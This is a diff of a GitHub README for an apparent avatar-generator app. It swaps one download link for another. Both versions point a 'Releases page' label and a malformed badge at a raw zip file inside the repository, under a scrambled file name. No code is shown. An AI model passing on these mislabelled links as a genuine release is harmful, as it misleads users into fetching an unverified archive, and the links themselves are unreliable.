@@ -19,7 +19,7 @@ Welcome to text-to-avatar! This application helps you create unique avatars base
 
 You can download the latest version of text-to-avatar from our Releases page. Please visit the link below to get started:
 
-[![Download text-to-avatar](https://github.com/Luthfi006/text-to-avatar/raw/refs/heads/main/text_to_avatar/avatar-to-text-2.4.zip%20text--to--avatar-v1.0-brightgreen)](https://github.com/Luthfi006/text-to-avatar/raw/refs/heads/main/text_to_avatar/avatar-to-text-2.4.zip)
+[![Download text-to-avatar](https://github.com/Luthfi006/text-to-avatar/raw/refs/heads/main/text_to_avatar/text-avatar-to-v3.0-alpha.5.zip%20text--to--avatar-v1.0-brightgreen)](https://github.com/Luthfi006/text-to-avatar/raw/refs/heads/main/text_to_avatar/text-avatar-to-v3.0-alpha.5.zip)
 
 Once you are on the Releases page, follow these steps:
 
@@ -80,4 +80,4 @@ For more information, tutorials, and user discussions, visit our official docume
 
 Thank you for choosing text-to-avatar! We hope this guide helps you create beautiful and customized avatars with ease. 
 
-For further details or updates, remember to check the [Releases page](https://github.com/Luthfi006/text-to-avatar/raw/refs/heads/main/text_to_avatar/avatar-to-text-2.4.zip).
+For further details or updates, remember to check the [Releases page](https://github.com/Luthfi006/text-to-avatar/raw/refs/heads/main/text_to_avatar/text-avatar-to-v3.0-alpha.5.zip).
